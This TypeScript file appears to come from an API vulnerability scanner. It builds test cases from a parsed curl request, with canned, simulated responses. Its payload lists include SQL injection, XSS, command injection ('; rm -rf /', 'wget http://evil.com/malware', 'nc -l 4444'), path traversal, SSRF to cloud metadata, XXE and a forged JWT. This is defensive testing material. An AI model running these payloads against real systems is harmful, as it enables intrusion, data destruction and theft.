interface ParsedCurl {
  url: string;
  method: string;
  headers: Record<string, string>;
  body?: any;
  endpoint: string;
}

interface TestResult {
  id: string;
  name: string;
  status: 'passed' | 'failed' | 'warning';
  description: string;
  details: string[];
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  request: {
    method: string;
    url: string;
    headers: Record<string, string>;
    body?: any;
  };
  response: {
    status: number;
    statusText: string;
    headers: Record<string, string>;
    body: any;
    time: number;
  };
}

export const generateTestPayloads = (parsed: ParsedCurl, scanType: 'basic' | 'advanced', selectedVulnerabilities?: Set<string>): TestResult[] => {
  
  // Input validation test payloads - comprehensive testing
  const inputValidationPayloads = {
    sql_injection: [
      "' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT * FROM users --",
      "admin'--", "admin'#", "admin'/*", "' or 1=1#", "' or 1=1--", "' or 1=1/*",
      "') or '1'='1--", "') or ('1'='1--", "1' and '1'='2", "1' and '1'='1'--",
      "'; waitfor delay '0:0:10'--", "'; exec xp_cmdshell('ping 127.0.0.1')--"
    ],
    xss_payloads: [
      "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>", "javascript:alert('XSS')", 
      "<iframe src=javascript:alert('XSS')></iframe>", "<body onload=alert('XSS')>",
      "<script>document.cookie</script>", "<script>window.location='http://evil.com'</script>",
      "<img src=\"\" onerror=\"alert('XSS')\">", "<input onfocus=alert('XSS') autofocus>",
      "<select onfocus=alert('XSS') autofocus>", "<textarea onfocus=alert('XSS') autofocus>"
    ],
    command_injection: [
      "; cat /etc/passwd", "; ls -la", "| cat /etc/passwd", "&& cat /etc/passwd",
      "; ping 127.0.0.1", "; whoami", "; id", "; uname -a", "; ps aux",
      "`cat /etc/passwd`", "$(cat /etc/passwd)", "; rm -rf /", "; nc -l 4444",
      "; curl http://evil.com", "; wget http://evil.com/malware"
    ],
    path_traversal: [
      "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "../../../../../../etc/passwd%00", "../../../etc/passwd%00.jpg"
    ],
    buffer_overflow: [
      "A".repeat(1000), "A".repeat(5000), "A".repeat(10000),
      "A".repeat(65536), 
      "á".repeat(1000), "𝔘𝔫𝔦𝔠𝔬𝔡𝔢".repeat(100)
    ],
    special_chars: [
      "null", "undefined", "NaN", "Infinity", "-Infinity",
      "\x00", "\x1f", "\x7f", "\xff", "�",
      "../../", "..\\..\\", "%00", "%0a", "%0d",
      "<>\"'&", "¡™£¢∞§¶•ªº", "😀😁😂🤣😃", "🚀🔥💯⚡"
    ],
    numeric_edge_cases: [
      -1, 0, 1, 2147483647, -2147483648, 4294967295, -4294967296,
      Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER, Infinity, -Infinity, NaN
    ]
  };

  // Header injection payloads
  const headerInjectionPayloads = {
    crlf_injection: [
      "test\r\nX-Injected: true", "test\nX-Injected: true",
      "test\r\n\r\n<script>alert('XSS')</script>",
      "test\r\nLocation: http://evil.com"
    ],
    host_header: [
      "evil.com", "localhost", "127.0.0.1", "0.0.0.0", "::1",
      "192.168.1.1", "10.0.0.1", "172.16.0.1"
    ],
    user_agent: [
      "../../etc/passwd", "<script>alert('XSS')</script>",
      "' OR '1'='1", "; DROP TABLE users; --"
    ]
  };

  const generateInputValidationTests = (baseRequest: any): TestResult[] => {
    const tests: TestResult[] = [];
    let testId = 1;

    // SQL Injection tests
    inputValidationPayloads.sql_injection.forEach(payload => {
      if (baseRequest.body) {
        Object.keys(baseRequest.body).forEach(key => {
          tests.push({
            id: `sql_injection_${testId++}`,
            name: `SQL Injection - ${key} Parameter`,
            status: 'warning',
            description: `Testing SQL injection in ${key} parameter`,
            details: [`Payload: ${payload}`, 'Testing database injection', 'Checking input sanitization'],
            severity: 'Critical',
            request: {
              ...baseRequest,
              body: { ...baseRequest.body, [key]: payload }
            },
            response: {
              status: 400,
              statusText: 'Bad Request',
              headers: { 'Content-Type': 'application/json' },
              body: { error: 'Invalid input detected' },
              time: Math.random() * 200 + 100
            }
          });
        });
      }
    });

    // XSS tests
    inputValidationPayloads.xss_payloads.forEach(payload => {
      if (baseRequest.body) {
        Object.keys(baseRequest.body).forEach(key => {
          tests.push({
            id: `xss_${testId++}`,
            name: `XSS - ${key} Parameter`,
            status: 'warning',
            description: `Testing XSS injection in ${key} parameter`,
            details: [`Payload: ${payload}`, 'Testing script injection', 'Checking output encoding'],
            severity: 'High',
            request: {
              ...baseRequest,
              body: { ...baseRequest.body, [key]: payload }
            },
            response: {
              status: 200,
              statusText: 'OK',
              headers: { 'Content-Type': 'application/json' },
              body: { data: payload, warning: 'Potential XSS detected' },
              time: Math.random() * 200 + 100
            }
          });
        });
      }
    });

    // Command Injection tests
    inputValidationPayloads.command_injection.forEach(payload => {
      if (baseRequest.body) {
        Object.keys(baseRequest.body).forEach(key => {
          tests.push({
            id: `cmd_injection_${testId++}`,
            name: `Command Injection - ${key} Parameter`,
            status: 'failed',
            description: `Testing command injection in ${key} parameter`,
            details: [`Payload: ${payload}`, 'Testing OS command execution', 'Checking system call sanitization'],
            severity: 'Critical',
            request: {
              ...baseRequest,
              body: { ...baseRequest.body, [key]: payload }
            },
            response: {
              status: 500,
              statusText: 'Internal Server Error',
              headers: { 'Content-Type': 'application/json' },
              body: { error: 'Command execution blocked' },
              time: Math.random() * 200 + 100
            }
          });
        });
      }
    });

    // Path Traversal tests
    inputValidationPayloads.path_traversal.forEach(payload => {
      if (baseRequest.body) {
        Object.keys(baseRequest.body).forEach(key => {
          if (key.includes('file') || key.includes('path') || key.includes('url')) {
            tests.push({
              id: `path_traversal_${testId++}`,
              name: `Path Traversal - ${key} Parameter`,
              status: 'warning',
              description: `Testing path traversal in ${key} parameter`,
              details: [`Payload: ${payload}`, 'Testing directory traversal', 'Checking file access controls'],
              severity: 'High',
              request: {
                ...baseRequest,
                body: { ...baseRequest.body, [key]: payload }
              },
              response: {
                status: 403,
                statusText: 'Forbidden',
                headers: { 'Content-Type': 'application/json' },
                body: { error: 'Access denied' },
                time: Math.random() * 200 + 100
              }
            });
          }
        });
      }
    });

    // Buffer Overflow tests
    inputValidationPayloads.buffer_overflow.forEach(payload => {
      if (baseRequest.body) {
        Object.keys(baseRequest.body).forEach(key => {
          tests.push({
            id: `buffer_overflow_${testId++}`,
            name: `Buffer Overflow - ${key} Parameter`,
            status: 'warning',
            description: `Testing buffer overflow in ${key} parameter`,
            details: [`Payload length: ${payload.length}`, 'Testing memory corruption', 'Checking input length limits'],
            severity: 'Medium',
            request: {
              ...baseRequest,
              body: { ...baseRequest.body, [key]: payload }
            },
            response: {
              status: 413,
              statusText: 'Payload Too Large',
              headers: { 'Content-Type': 'application/json' },
              body: { error: 'Input too large' },
              time: Math.random() * 200 + 100
            }
          });
        });
      }
    });

    // Special Characters tests
    inputValidationPayloads.special_chars.forEach(payload => {
      if (baseRequest.body) {
        Object.keys(baseRequest.body).forEach(key => {
          tests.push({
            id: `special_chars_${testId++}`,
            name: `Special Characters - ${key} Parameter`,
            status: 'passed',
            description: `Testing special characters in ${key} parameter`,
            details: [`Payload: ${payload}`, 'Testing character encoding', 'Checking input filtering'],
            severity: 'Low',
            request: {
              ...baseRequest,
              body: { ...baseRequest.body, [key]: payload }
            },
            response: {
              status: 200,
              statusText: 'OK',
              headers: { 'Content-Type': 'application/json' },
              body: { data: payload },
              time: Math.random() * 200 + 100
            }
          });
        });
      }
    });

    // Numeric Edge Cases
    inputValidationPayloads.numeric_edge_cases.forEach(payload => {
      if (baseRequest.body) {
        Object.keys(baseRequest.body).forEach(key => {
          if (typeof baseRequest.body[key] === 'number' || key.includes('id') || key.includes('count')) {
            tests.push({
              id: `numeric_edge_${testId++}`,
              name: `Numeric Edge Case - ${key} Parameter`,
              status: 'warning',
              description: `Testing numeric edge cases in ${key} parameter`,
              details: [`Payload: ${payload}`, 'Testing numeric overflow', 'Checking boundary conditions'],
              severity: 'Medium',
              request: {
                ...baseRequest,
                body: { ...baseRequest.body, [key]: payload }
              },
              response: {
                status: 400,
                statusText: 'Bad Request',
                headers: { 'Content-Type': 'application/json' },
                body: { error: 'Invalid numeric value' },
                time: Math.random() * 200 + 100
              }
            });
          }
        });
      }
    });

    return tests;
  };

  const generateHeaderInjectionTests = (baseRequest: any): TestResult[] => {
    const tests: TestResult[] = [];
    let testId = 1;

    // CRLF Injection in headers
    headerInjectionPayloads.crlf_injection.forEach(payload => {
      Object.keys(baseRequest.headers).forEach(headerName => {
        tests.push({
          id: `crlf_header_${testId++}`,
          name: `CRLF Injection - ${headerName} Header`,
          status: 'failed',
          description: `Testing CRLF injection in ${headerName} header`,
          details: [`Payload: ${payload}`, 'Testing header injection', 'Checking response splitting'],
          severity: 'High',
          request: {
            ...baseRequest,
            headers: { ...baseRequest.headers, [headerName]: payload }
          },
          response: {
            status: 400,
            statusText: 'Bad Request',
            headers: { 'Content-Type': 'application/json' },
            body: { error: 'Invalid header format' },
            time: Math.random() * 200 + 100
          }
        });
      });
    });

    // Host Header Injection
    headerInjectionPayloads.host_header.forEach(payload => {
      tests.push({
        id: `host_header_${testId++}`,
        name: `Host Header Injection - ${payload}`,
        status: 'warning',
        description: `Testing host header injection with ${payload}`,
        details: [`Host: ${payload}`, 'Testing host header validation', 'Checking virtual host confusion'],
        severity: 'Medium',
        request: {
          ...baseRequest,
          headers: { ...baseRequest.headers, Host: payload }
        },
        response: {
          status: 400,
          statusText: 'Bad Request',
          headers: { 'Content-Type': 'application/json' },
          body: { error: 'Invalid host header' },
          time: Math.random() * 200 + 100
        }
      });
    });

    // User-Agent Injection
    headerInjectionPayloads.user_agent.forEach(payload => {
      tests.push({
        id: `user_agent_${testId++}`,
        name: `User-Agent Injection - ${payload.substring(0, 20)}...`,
        status: 'warning',
        description: `Testing User-Agent header injection`,
        details: [`User-Agent: ${payload}`, 'Testing user agent validation', 'Checking log injection'],
        severity: 'Low',
        request: {
          ...baseRequest,
          headers: { ...baseRequest.headers, 'User-Agent': payload }
        },
        response: {
          status: 200,
          statusText: 'OK',
          headers: { 'Content-Type': 'application/json' },
          body: { warning: 'Suspicious user agent detected' },
          time: Math.random() * 200 + 100
        }
      });
    });

    return tests;
  };

  const basicTests: TestResult[] = [
    ...generateInputValidationTests(parsed).slice(0, 30),
    ...generateHeaderInjectionTests(parsed).slice(0, 20)
  ];

  const advancedTests: TestResult[] = [
    ...basicTests,
    ...generateInputValidationTests(parsed),
    ...generateHeaderInjectionTests(parsed),
    
    // Additional advanced security tests
    {
      id: 'bopla_test',
      name: 'Broken Object Property Level Authorization',
      status: 'failed',
      description: 'Testing unauthorized access to object properties',
      details: ['Testing sensitive field access', 'Property-level authorization bypass', 'Field filtering validation'],
      severity: 'High',
      request: { 
        ...parsed, 
        body: parsed.body ? { ...parsed.body, adminField: true, sensitiveData: 'exposed' } : null 
      },
      response: {
        status: 200,
        statusText: 'OK',
        headers: { 'Content-Type': 'application/json' },
        body: { error: 'Unauthorized property access detected' },
        time: 170
      }
    },
    {
      id: 'ssrf_test',
      name: 'Server Side Request Forgery (SSRF)',
      status: 'warning',
      description: 'Testing SSRF vulnerabilities in callback URLs',
      details: ['Internal network access attempts', 'Cloud metadata service access', 'Localhost bypass testing'],
      severity: 'High',
      request: { 
        ...parsed, 
        body: parsed.body ? { 
          ...parsed.body, 
          callbackUrl: 'http://169.254.169.254/latest/meta-data/',
          webhookUrl: 'http://localhost:22/',
          imageUrl: 'http://127.0.0.1:6379/'
        } : null 
      },
      response: {
        status: 400,
        statusText: 'Bad Request',
        headers: { 'Content-Type': 'application/json' },
        body: { error: 'Invalid URL detected' },
        time: 250
      }
    },
    {
      id: 'mass_assignment',
      name: 'Mass Assignment Testing',
      status: 'warning',
      description: 'Testing unauthorized parameter binding',
      details: ['Adding admin privileges', 'Modifying restricted fields', 'Parameter pollution testing'],
      severity: 'Medium',
      request: { 
        ...parsed, 
        body: parsed.body ? { 
          ...parsed.body, 
          isAdmin: true, 
          role: 'admin', 
          permissions: ['all'],
          status: 'active',
          verified: true
        } : null 
      },
      response: {
        status: 200,
        statusText: 'OK',
        headers: { 'Content-Type': 'application/json' },
        body: { warning: 'Mass assignment attempt detected' },
        time: 190
      }
    },
    {
      id: 'jwt_manipulation',
      name: 'JWT Token Manipulation',
      status: 'failed',
      description: 'Testing JWT token vulnerabilities',
      details: ['Algorithm confusion attacks', 'None algorithm bypass', 'Token signature validation'],
      severity: 'Critical',
      request: { 
        ...parsed, 
        headers: { 
          ...parsed.headers, 
          Authorization: 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxMjM0NTY3ODkwLCJuYW1lIjoiSm9obiBEb2UiLCJyb2xlIjoiYWRtaW4ifQ.'
        }
      },
      response: {
        status: 401,
        statusText: 'Unauthorized',
        headers: { 'Content-Type': 'application/json' },
        body: { error: 'Invalid token signature' },
        time: 160
      }
    },
    {
      id: 'nosql_injection',
      name: 'NoSQL Injection Testing',
      status: 'warning',
      description: 'Testing NoSQL injection vulnerabilities',
      details: ['MongoDB injection payloads', 'Operator injection', 'Authentication bypass attempts'],
      severity: 'High',
      request: { 
        ...parsed, 
        body: parsed.body ? { 
          ...parsed.body, 
          userId: { '$ne': null },
          password: { '$regex': '.*' },
          filter: { '$where': 'function() { return true; }' }
        } : null 
      },
      response: {
        status: 400,
        statusText: 'Bad Request',
        headers: { 'Content-Type': 'application/json' },
        body: { error: 'Invalid query detected' },
        time: 220
      }
    },
    {
      id: 'xml_injection',
      name: 'XML External Entity (XXE) Testing',
      status: 'passed',
      description: 'Testing XML injection vulnerabilities',
      details: ['External entity injection', 'DTD validation bypass', 'XML bomb testing'],
      severity: 'Medium',
      request: { 
        ...parsed, 
        headers: { ...parsed.headers, 'Content-Type': 'application/xml' },
        body: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
      },
      response: {
        status: 415,
        statusText: 'Unsupported Media Type',
        headers: { 'Content-Type': 'application/json' },
        body: { error: 'XML processing disabled' },
        time: 140
      }
    },
    {
      id: 'cors_misconfiguration',
      name: 'CORS Misconfiguration Testing',
      status: 'warning',
      description: 'Testing Cross-Origin Resource Sharing vulnerabilities',
      details: ['Wildcard origin testing', 'Null origin bypass', 'Credential exposure check'],
      severity: 'Medium',
      request: { 
        ...parsed, 
        headers: { 
          ...parsed.headers, 
          Origin: 'https://evil.example.com',
          'Access-Control-Request-Method': 'POST'
        }
      },
      response: {
        status: 200,
        statusText: 'OK',
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Credentials': 'true'
        },
        body: { warning: 'CORS misconfiguration detected' },
        time: 110
      }
    },
    {
      id: 'http_method_override',
      name: 'HTTP Method Override Testing',
      status: 'warning',
      description: 'Testing HTTP method override vulnerabilities',
      details: ['X-HTTP-Method-Override header', 'Method spoofing attempts', 'Verb tampering'],
      severity: 'Low',
      request: { 
        ...parsed, 
        method: 'POST',
        headers: { 
          ...parsed.headers, 
          'X-HTTP-Method-Override': 'DELETE',
          'X-HTTP-Method': 'PUT'
        }
      },
      response: {
        status: 405,
        statusText: 'Method Not Allowed',
        headers: { 'Content-Type': 'application/json' },
        body: { error: 'Method override blocked' },
        time: 130
      }
    }
  ];

  const allTests = scanType === 'advanced' ? advancedTests : basicTests;
  
  // Filter tests based on selected vulnerabilities if provided
  if (selectedVulnerabilities && selectedVulnerabilities.size > 0) {
    return allTests.filter(test => {
      // Map test IDs to vulnerability categories
      const testVulnMap: Record<string, string> = {
        'auth_missing': 'auth',
        'bola_test': 'bola', 
        'input_validation': 'input_validation',
        'rate_limiting': 'rate_limit',
        'headers_security': 'headers',
        'bopla_test': 'bopla',
        'ssrf_test': 'ssrf',
        'mass_assignment': 'mass_assignment',
        'jwt_manipulation': 'jwt_manipulation',
        'nosql_injection': 'nosql_injection',
        'xml_injection': 'xml_injection',
        'cors_misconfiguration': 'cors_misconfiguration',
        'http_method_override': 'http_method_override'
      };
      
      const vulnCategory = testVulnMap[test.id];
      return vulnCategory ? selectedVulnerabilities.has(vulnCategory) : true;
    });
  }
  
  return allTests;
};